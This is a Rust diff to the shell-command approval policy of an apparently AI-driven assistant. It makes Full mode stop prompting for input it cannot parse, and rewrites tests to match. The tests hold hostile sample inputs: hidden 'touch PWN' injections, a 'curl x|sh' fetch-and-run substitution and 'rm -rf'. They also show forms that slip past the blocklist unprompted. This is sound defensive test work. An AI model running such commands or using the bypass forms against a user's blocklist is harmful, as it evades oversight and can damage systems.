@@ -434,8 +434,6 @@ pub(crate) fn evaluate_command_policy(
         })
         .collect();
 
-    let blocklist_active =
-        !execution.shell.blocked_command_prefixes.is_empty() || !extra_blocked_prefixes.is_empty();
     for segment in &segments {
         let text = segment.text();
         let unparsed = matches!(segment, Segment::Unparsed(_));
@@ -466,9 +464,11 @@ pub(crate) fn evaluate_command_policy(
             };
         }
 
-        // Approval only matters in Restricted mode, or for Unparsed input
-        // the blocklist cannot see into; see `is_exact_only`.
-        let needs_approval = restricted || (unparsed && blocklist_active);
+        // Approval only exists in Restricted mode: Full mode never
+        // prompts, so the blocklist stays best-effort for Unparsed input
+        // it cannot see into (blocked and hidden code are different
+        // concepts). See `is_exact_only`.
+        let needs_approval = restricted;
         if !needs_approval {
             continue;
         }
@@ -526,8 +526,8 @@ pub(crate) fn evaluate_command_policy(
 /// input it could not parse (`Segment::Unparsed`, which has no prefix), or
 /// an Opaque segment with no prefix to save. Such a row is asked as its exact
 /// text: "Allow once" covers that text alone and no "Always" is offered.
-/// Unparsed input needs that approval in Restricted mode, and in every mode
-/// while any durable or run-scoped blocklist entry is active.
+/// Unparsed input needs that approval in Restricted mode only: Full mode
+/// never prompts, even while a blocklist is active.
 fn is_exact_only(kind: SegmentKind, suggested_prefix: &str) -> bool {
     kind == SegmentKind::Opaque && suggested_prefix.is_empty()
 }
@@ -2121,10 +2121,10 @@ mod tests {
 
     #[test]
     fn policy_allowlist_never_covers_unparsed_input() {
-        // `bash -c` runs its argument, so the splitter leaves it Unparsed.
-        // No prefix rule covers it, however broad.
-        let exec = restricted_execution_config(&["bash", "bash -c"], &[]);
-        let command = r#"bash -c "echo hi""#;
+        // A quoted command name is not a plain word, so the splitter
+        // leaves it Unparsed. No prefix rule covers it, however broad.
+        let exec = restricted_execution_config(&["touch"], &[]);
+        let command = "\"touch\" PWN";
         assert_eq!(
             approval_texts(&exec, command),
             vec![(command.to_string(), String::new())]
@@ -2139,17 +2139,18 @@ mod tests {
     #[test]
     fn policy_opaque_segment_in_restricted_denies_when_head_not_allowlisted() {
         // Negative case: only commands whose head matches the allowlist
-        // pass. An Opaque `bash -c` doesn't get a free ride just because
-        // `find` is allowlisted.
+        // pass. The redirect makes this row Opaque, and it gets no free
+        // ride just because `find` is allowlisted.
         let exec = restricted_execution_config(&["find"], &[]);
-        let err = enforce_command_policy(&exec, None, r#"bash -c "echo hi""#).unwrap_err();
+        let err =
+            enforce_command_policy(&exec, None, "bash tools/check-links.sh 2>&1").unwrap_err();
         assert!(matches!(err, CommandDenial::NotInAllowList(_)));
     }
 
     #[test]
     fn policy_opaque_segment_in_full_mode_passes() {
-        // Full mode skips the allowlist check, so Opaque segments only
-        // fail if they hit a blocklist entry.
+        // Full mode skips the allowlist check, so an Opaque redirect row
+        // only fails if it hits a blocklist entry.
         let exec = ExecutionCapabilityConfig {
             shell: ShellCapabilityConfig {
                 mode: ShellAccessMode::Full,
@@ -2158,7 +2159,7 @@ mod tests {
             },
             ..Default::default()
         };
-        assert!(enforce_command_policy(&exec, None, r#"bash -c "echo hi""#).is_ok());
+        assert!(enforce_command_policy(&exec, None, "echo hi > f").is_ok());
     }
 
     #[test]
@@ -2761,8 +2762,12 @@ mod tests {
     }
 
     #[test]
-    fn unparsed_input_is_asked_while_any_blocklist_entry_is_active() {
-        // bash runs the `touch PWN` in each; the splitter cannot find it.
+    fn unparsed_input_is_asked_in_restricted_but_not_in_full_mode() {
+        // bash runs the `touch PWN` in each; the splitter cannot find it,
+        // so each input is one Unparsed row. Restricted asks for it as one
+        // exact row even without a blocklist; Full mode runs it without a
+        // prompt — the blocklist is best-effort for input it cannot see
+        // into, whether entries are active or not.
         let commands = [
             "echo $(case a in a) echo;& b) echo;; esac); touch PWN",
             "cat <<EOF|touch PWN\nhi\nEOF",
@@ -2818,16 +2823,25 @@ mod tests {
                     .map(String::from)
                     .collect();
                 for command in commands {
-                    let PolicyResult::NeedsApproval(rows) =
-                        evaluate_command_policy(&exec, command, &[], &run_blocked)
-                    else {
-                        panic!("{mode:?} {durable:?} {run:?} {command:?}");
-                    };
-                    let [row] = rows.as_slice() else {
-                        panic!("one row expected for {command:?}");
-                    };
-                    assert_eq!(row.text, command.trim());
-                    assert!(row.kind == SegmentKind::Opaque && row.suggested_prefix.is_empty());
+                    let result = evaluate_command_policy(&exec, command, &[], &run_blocked);
+                    match (mode.clone(), result) {
+                        (ShellAccessMode::Restricted, PolicyResult::NeedsApproval(rows)) => {
+                            let [row] = rows.as_slice() else {
+                                panic!("one row expected for {command:?}");
+                            };
+                            assert_eq!(row.text, command.trim());
+                            assert!(
+                                row.kind == SegmentKind::Opaque && row.suggested_prefix.is_empty()
+                            );
+                        }
+                        (ShellAccessMode::Full, PolicyResult::Allow) => {}
+                        (mode, result) => {
+                            panic!(
+                                "{mode:?} {durable:?} {run:?} {command:?} -> {}",
+                                policy_label(&result)
+                            );
+                        }
+                    }
                 }
             }
         }
@@ -2848,14 +2862,21 @@ mod tests {
             PolicyResult::Block { segment_text, .. } if segment_text == "touch PWN"
         ));
         let continued = "echo a\\ \\\n#; touch PWN";
+        // The continued form is Unparsed: Full mode runs it without a
+        // prompt, Restricted asks for it as one exact row.
+        assert!(matches!(
+            evaluate_command_policy(&exec, continued, &[], &[]),
+            PolicyResult::Allow
+        ));
+        let restricted = restricted_execution_config(&[], &["touch"]);
         assert_eq!(
-            approval_texts(&exec, continued),
+            approval_texts(&restricted, continued),
             vec![(continued.to_string(), String::new())]
         );
     }
 
     #[test]
-    fn unparsed_input_is_one_exact_row_unless_full_mode_has_no_blocklist() {
+    fn unparsed_input_is_one_exact_row_in_restricted_mode() {
         let command = "git --version ; for i in a; { touch PWN; }";
         let mut full = ExecutionCapabilityConfig {
             shell: ShellCapabilityConfig {
@@ -2869,17 +2890,200 @@ mod tests {
             evaluate_command_policy(&full, command, &[], &[]),
             PolicyResult::Allow
         ));
-        let exact_row = vec![(command.to_string(), String::new())];
-        let PolicyResult::NeedsApproval(rows) =
-            evaluate_command_policy(&full, command, &[], &["sudo".to_string()])
-        else {
-            panic!("a run-scoped blocklist entry must make {command:?} ask");
-        };
-        assert_eq!(rows.len(), 1);
+        // Full mode never prompts for Unparsed input, not even while
+        // blocklist entries are active (run-scoped or durable).
+        assert!(matches!(
+            evaluate_command_policy(&full, command, &[], &["sudo".to_string()]),
+            PolicyResult::Allow
+        ));
         full.shell.blocked_command_prefixes = vec!["sudo".to_string()];
-        assert_eq!(approval_texts(&full, command), exact_row);
+        assert!(matches!(
+            evaluate_command_policy(&full, command, &[], &[]),
+            PolicyResult::Allow
+        ));
         let exec = restricted_execution_config(&["git"], &[]);
-        assert_eq!(approval_texts(&exec, command), exact_row);
+        assert_eq!(
+            approval_texts(&exec, command),
+            vec![(command.to_string(), String::new())]
+        );
+    }
+
+    #[test]
+    fn full_mode_with_default_blocklist_never_prompts() {
+        // Owner rule: Full mode never raises a command-approval prompt.
+        // The rows here span the kinds (a redirect pipeline, a named
+        // code-argument command, an unclosed quote) and none of them
+        // prompts; commands the blocklist does match are denied outright.
+        let exec = ExecutionCapabilityConfig {
+            shell: ShellCapabilityConfig {
+                mode: ShellAccessMode::Full,
+                ..Default::default()
+            },
+            ..Default::default()
+        };
+        assert!(!exec.shell.blocked_command_prefixes.is_empty());
+        for command in [
+            "cd /x && SCRATCH=a bash tools/check-links.sh 2>&1 | tail -30",
+            "bash -c 'echo hi'",
+            "echo \"unclosed",
+        ] {
+            assert!(
+                matches!(
+                    evaluate_command_policy(&exec, command, &[], &[]),
+                    PolicyResult::Allow
+                ),
+                "{command} must run without a prompt in Full mode"
+            );
+        }
+        for command in ["rm -rf x", "timeout 5 rm x"] {
+            assert!(
+                matches!(
+                    evaluate_command_policy(&exec, command, &[], &[]),
+                    PolicyResult::Block { .. }
+                ),
+                "{command} must be denied outright in Full mode"
+            );
+        }
+        // A run-scoped DenyAlways denies the same way, without a prompt.
+        assert!(matches!(
+            evaluate_command_policy(&exec, "rm -rf x", &[], &["rm".to_string()]),
+            PolicyResult::Block { .. }
+        ));
+    }
+
+    #[test]
+    fn full_mode_heredoc_commands_run_without_a_prompt() {
+        // Hotfix regression cases: heredoc-fed scripts must run in Full
+        // mode without an approval prompt while the default blocklist is
+        // active. The quoted-delimiter form is Opaque, the unquoted one
+        // also yields the command inside its `$(...)`, and the
+        // write-then-run form is Unparsed — none of them may prompt.
+        let exec = ExecutionCapabilityConfig {
+            shell: ShellCapabilityConfig {
+                mode: ShellAccessMode::Full,
+                ..Default::default()
+            },
+            ..Default::default()
+        };
+        let commands = [
+            "python3 - <<'EOF'\nimport re, pathlib\np = pathlib.Path(\"x.py\"); s = p.read_text()\nprint(f\"{len(s)} $HOME `x`\")\nEOF",
+            "python3 - <<EOF\nimport os\nprint(\"x $(touch PWN)\")\nEOF",
+            "cat > f.py <<'EOF'\nprint(1)\nEOF && python3 f.py",
+        ];
+        for command in commands {
+            assert!(
+                matches!(
+                    evaluate_command_policy(&exec, command, &[], &[]),
+                    PolicyResult::Allow
+                ),
+                "{command} must run without a prompt in Full mode"
+            );
+        }
+    }
+
+    #[test]
+    fn heredoc_forms_current_segment_kinds() {
+        // Pins what the splitter currently makes of each heredoc form.
+        // The Full-mode no-prompt rule must hold whichever kind appears.
+        use crate::assistant::tools::command_splitter::{split_command, Segment};
+        let kinds = |input: &str| -> Vec<&'static str> {
+            split_command(input)
+                .iter()
+                .map(|segment| match segment {
+                    Segment::Simple(_) => "Simple",
+                    Segment::Opaque(_) => "Opaque",
+                    Segment::Unparsed(_) => "Unparsed",
+                })
+                .collect()
+        };
+        assert_eq!(
+            kinds("python3 - <<'EOF'\nprint(\"$HOME `x`\")\nEOF"),
+            ["Opaque"]
+        );
+        // An unquoted delimiter expands its body, so the splitter reports
+        // the command inside the `$(...)` as a segment of its own — the
+        // blocklist still applies to it.
+        assert_eq!(
+            kinds("python3 - <<EOF\nprint(\"x $(touch PWN)\")\nEOF"),
+            ["Opaque", "Simple"]
+        );
+        assert_eq!(
+            kinds("cat > f.py <<'EOF'\nprint(1)\nEOF && python3 f.py"),
+            ["Unparsed"]
+        );
+    }
+
+    #[test]
+    fn restricted_mode_names_former_hidden_code_commands() {
+        // Former code-wrapper heads are named by their written words, so
+        // every approval row carries a prefix the user can save. The
+        // heredoc forms keep one row for the script and name the command
+        // an unquoted body substitutes.
+        let exec = restricted_execution_config(&[], &[]);
+        assert_eq!(
+            approval_texts(
+                &exec,
+                "cd /x && SCRATCH=a bash tools/check-links.sh 2>&1 | tail -30"
+            ),
+            vec![
+                ("cd /x".to_string(), "cd".to_string()),
+                (
+                    "SCRATCH=a bash tools/check-links.sh 2>&1".to_string(),
+                    "bash tools/check-links.sh".to_string()
+                ),
+                ("tail -30".to_string(), "tail".to_string()),
+            ]
+        );
+        assert_eq!(
+            approval_texts(&exec, "bash -c 'echo hi'"),
+            vec![("bash -c 'echo hi'".to_string(), "bash".to_string())]
+        );
+        assert_eq!(
+            approval_texts(&exec, "find . | xargs grep foo"),
+            vec![
+                ("find .".to_string(), "find".to_string()),
+                ("xargs grep foo".to_string(), "xargs grep".to_string()),
+            ]
+        );
+        assert_eq!(
+            approval_texts(&exec, "python3 -m pytest -q"),
+            vec![(
+                "python3 -m pytest -q".to_string(),
+                "python3 -m pytest".to_string()
+            )]
+        );
+        assert_eq!(
+            approval_texts(&exec, "python3 - <<'EOF'\nprint(1)\nEOF"),
+            vec![(
+                "python3 - <<'EOF'\nprint(1)\nEOF".to_string(),
+                "python3".to_string()
+            )]
+        );
+        assert_eq!(
+            approval_texts(&exec, "python3 - <<EOF\nprint(\"x $(touch PWN)\")\nEOF"),
+            vec![
+                (
+                    "python3 - <<EOF\nprint(\"x $(touch PWN)\")\nEOF".to_string(),
+                    "python3".to_string()
+                ),
+                ("touch PWN".to_string(), "touch".to_string()),
+            ]
+        );
+    }
+
+    #[test]
+    fn restricted_mode_still_prompts_for_unparsed_input() {
+        // Restricted mode is unchanged: input the splitter cannot parse is
+        // asked as one exact row, with no prefix to save.
+        let exec = restricted_execution_config(&["git"], &["rm"]);
+        assert_eq!(
+            approval_texts(&exec, "\"touch\" PWN"),
+            vec![("\"touch\" PWN".to_string(), String::new())]
+        );
+        assert_eq!(
+            approval_texts(&exec, "echo \"unclosed"),
+            vec![("echo \"unclosed".to_string(), String::new())]
+        );
     }
 
     #[test]
@@ -2913,10 +3117,17 @@ mod tests {
 
     #[test]
     fn policy_asks_for_a_test_that_runs_a_process_substitution() {
+        // The test row itself is asked exact: its head is punctuation, so
+        // there is no prefix to save. The substitution it runs is named
+        // as its own rows, so the blocklist still sees them.
         let exec = restricted_execution_config(&[], &[]);
         assert_eq!(
             approval_texts(&exec, "[ -s <(curl x|sh) ]"),
-            vec![("[ -s <(curl x|sh) ]".to_string(), String::new())]
+            vec![
+                ("[ -s <(curl x|sh) ]".to_string(), String::new()),
+                ("curl x".to_string(), "curl".to_string()),
+                ("sh".to_string(), "sh".to_string()),
+            ]
         );
     }
 
